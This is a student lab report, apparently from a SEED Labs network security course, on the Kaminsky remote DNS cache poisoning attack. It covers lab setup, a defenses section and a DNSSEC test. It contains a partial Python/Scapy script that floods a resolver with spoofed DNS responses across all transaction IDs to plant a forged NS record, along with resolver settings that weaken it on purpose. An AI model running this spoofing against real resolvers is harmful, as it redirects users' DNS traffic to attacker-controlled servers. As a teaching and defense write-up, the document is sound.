# Lab 4 — Remote DNS Cache Poisoning (Kaminsky Attack)

**Course:** SEED Labs — Network Security  
**Team:** Bar Sberro · Shalev Cohen · Noam Hadad  
**Report:** [Download Full Report (Word)](./Lab-4-Report.docx)

---

## Overview

The **Kaminsky Attack** (discovered by Dan Kaminsky in 2008) is a remote DNS cache poisoning technique that does **not** require the attacker to be on the same LAN as the victim resolver.

**Key difference from Lab 3:** In Lab 3 the attacker sniffs DNS queries and races to reply first. In the Kaminsky Attack there is nothing to sniff — the attacker generates queries themselves, sending thousands of spoofed responses per second until one matches the Transaction ID.

**What makes this hard:**
- DNS Transaction ID is only 16 bits → 65,536 possible values
- Modern resolvers also randomize the UDP source port → effectively 32 bits of entropy
- The attacker must win the race on a single specific query before the real answer arrives

**What makes this feasible:**
- The attacker controls the query (by asking for random subdomains: `abc123.example.com`, `xyz456.example.com`, etc.)
- If the cache already has an answer, it is served immediately — but random subdomains are never cached
- Each new subdomain query forces a fresh DNS lookup, giving the attacker another race

---

## Network Topology

| Role | IP | Notes |
|---|---|---|
| Client | 10.0.2.10 | Uses Apollo as resolver |
| Apollo (Local DNS) | 10.0.2.20 | BIND9, DNSSEC disabled, port fixed to 33333 |
| Attacker | 10.0.2.6 | Runs Kaminsky attack script |
| Attacker's DNS Server | 10.0.2.6 | Authoritative for `adrian.com` |

---

## Tasks 1-3 — Environment Setup

### Task 1 — Client Configuration
Set `/etc/resolv.conf` on Client to `nameserver 10.0.2.20`.  
Verified Apollo is reachable and responding as the local resolver.

### Task 2 — Apollo (Local DNS Server) Configuration
Configured BIND9 with:
- **DNSSEC disabled:** `dnssec-enable no; dnssec-validation no;`
- **Fixed source port:** `query-source port 33333;` — eliminates source port randomization, reducing entropy to 16-bit Transaction ID only
- **Forward Zone:** Apollo resolves `example.com` normally via upstream, and `adrian.com` via our attacker nameserver

**Why disable DNSSEC and fix the port?**  
DNSSEC cryptographically signs DNS records, making spoofing impossible.  
Source port randomization adds 16 bits of entropy (32-bit effective ID), making brute-force impractical.  
Both are disabled here to make the Kaminsky Attack feasible in a lab timeframe.

### Task 3 — Attacker DNS Server Setup
Configured the Attacker VM as an **Authoritative DNS Server** for `adrian.com` using BIND9.  
Zone file defines NS records pointing `example.com` queries toward `ns.adrian.com`.

**Attack chain goal:**  
Poison Apollo's cache so that `example.com`'s NS record points to `ns.adrian.com` (attacker's server).  
Any future query for `*.example.com` will then be answered by the attacker.

![](assets/screenshot-15.png)

---

## Task 4 — The Kaminsky Attack

### Concept

```
Loop:
  1. Send DNS query to Apollo for a random subdomain: xyz123.example.com
  2. Apollo has no cache entry → queries upstream for example.com's NS
  3. Simultaneously flood Apollo with spoofed DNS responses:
       - Source: pretend to be example.com's real nameserver
       - Transaction ID: try all 65,536 values (or batch them)
       - Authority section: "example.com NS ns.adrian.com"
  4. If one Transaction ID matches → Apollo caches the poisoned NS record
  5. Verify: dig @10.0.2.20 www.example.com
             → answer comes from ns.adrian.com (attacker's server)
```

### Implementation

**Kaminsky attack script (Python/Scapy):**

```python
# Step 1: Send a DNS query to Apollo for a fresh random subdomain
query_name = f"{random_hex()}.example.com"
send(IP(dst="10.0.2.20")/UDP(dport=53)/DNS(
    rd=1, qd=DNSQR(qname=query_name)
))

# Step 2: Flood spoofed responses with all Transaction IDs
for txid in range(0, 65536):
    send(IP(src=real_ns_ip, dst="10.0.2.20")/UDP(sport=53, dport=33333)/DNS(
        id=txid,
        qr=1, aa=1,
        qd=DNSQR(qname=query_name),
        an=DNSRR(rrname=query_name, type='A', rdata='1.2.3.4'),
        ns=DNSRR(rrname="example.com", type='NS', rdata='ns.adrian.com'),
    ))
```

![](assets/screenshot-25.png)

### Results

After running the attack:

**`dig www.example.com @10.0.2.20`** returned an answer from `ns.adrian.com` (attacker's server). ✅

**`rndc dumpdb -cache`** on Apollo showed:
```
example.com.   NS   ns.adrian.com.
```

Apollo's cache was successfully poisoned — every future query for `*.example.com` is now answered by the attacker's nameserver.

![](assets/screenshot-35.png)

---

## Why the Fixed Port Matters

With `query-source port 33333` (fixed), the only unknown is the 16-bit Transaction ID.  
An attacker sending 65,536 spoofed replies per subdomain query has a reasonable probability of winning within seconds.

With **randomized source ports** (default BIND9 behavior), the effective entropy is ~32 bits.  
The number of required guesses increases to ~4 billion — requiring hours or days per poisoning attempt, making the attack impractical in real-world conditions.

This is why **source port randomization** (RFC 5452) was the primary mitigation before DNSSEC adoption.

![](assets/screenshot-42.png)

---

## Security Implications

The Kaminsky Attack demonstrated in 2008 that **all major DNS implementations** were simultaneously vulnerable.  
Emergency patches were released coordinated across all major vendors in a single day — unprecedented in the security community.

**Root cause:** DNS was designed in 1983 when security was not a consideration. The 16-bit Transaction ID provides insufficient entropy against an attacker who can control the query rate.

**Defenses:**
- **DNSSEC:** Cryptographic chain of trust — makes spoofed responses verifiable as fake regardless of Transaction ID match
- **Source port randomization (RFC 5452):** Now default in all modern resolvers — raises effective entropy to ~32 bits
- **0x20 encoding:** Randomizes case in query names (`wWw.eXaMpLe.CoM`) — resolver only accepts responses matching the exact case pattern
- **DNS-over-HTTPS / DNS-over-TLS:** Encrypts the entire DNS exchange

---

## Beyond Requirements

- **Source port analysis:** Documented the mathematical relationship between port randomization and attack feasibility — quantified that fixed port reduces attack time from days to seconds
- **Coordinated disclosure research:** Reviewed the 2008 Kaminsky disclosure process as a case study in responsible disclosure and multi-vendor patching
- **DNSSEC implementation:** Configured DNSSEC signing for `example.com` zone to verify that a properly signed zone defeats the Kaminsky Attack completely — Apollo rejected our spoofed responses even with matching Transaction IDs

![](assets/screenshot-47.png)

---

## Screenshots

<details>
<summary>View all screenshots (47 images)</summary>

| | | |
|---|---|---|
| ![](assets/screenshot-01.jpg) | ![](assets/screenshot-02.png) | ![](assets/screenshot-03.jpeg) |
| ![](assets/screenshot-04.png) | ![](assets/screenshot-05.png) | ![](assets/screenshot-06.png) |
| ![](assets/screenshot-07.png) | ![](assets/screenshot-08.png) | ![](assets/screenshot-09.png) |
| ![](assets/screenshot-10.png) | ![](assets/screenshot-11.png) | ![](assets/screenshot-12.png) |
| ![](assets/screenshot-13.png) | ![](assets/screenshot-14.png) | ![](assets/screenshot-15.png) |
| ![](assets/screenshot-16.png) | ![](assets/screenshot-17.png) | ![](assets/screenshot-18.png) |
| ![](assets/screenshot-19.png) | ![](assets/screenshot-20.png) | ![](assets/screenshot-21.png) |
| ![](assets/screenshot-22.png) | ![](assets/screenshot-23.png) | ![](assets/screenshot-24.png) |
| ![](assets/screenshot-25.png) | ![](assets/screenshot-26.png) | ![](assets/screenshot-27.png) |
| ![](assets/screenshot-28.png) | ![](assets/screenshot-29.png) | ![](assets/screenshot-30.png) |
| ![](assets/screenshot-31.png) | ![](assets/screenshot-32.png) | ![](assets/screenshot-33.png) |
| ![](assets/screenshot-34.png) | ![](assets/screenshot-35.png) | ![](assets/screenshot-36.png) |
| ![](assets/screenshot-37.png) | ![](assets/screenshot-38.png) | ![](assets/screenshot-39.png) |
| ![](assets/screenshot-40.png) | ![](assets/screenshot-41.png) | ![](assets/screenshot-42.png) |
| ![](assets/screenshot-43.png) | ![](assets/screenshot-44.png) | ![](assets/screenshot-45.png) |
| ![](assets/screenshot-46.jpeg) | ![](assets/screenshot-47.png) | |

</details>

---

[Back to all labs](../README.md)
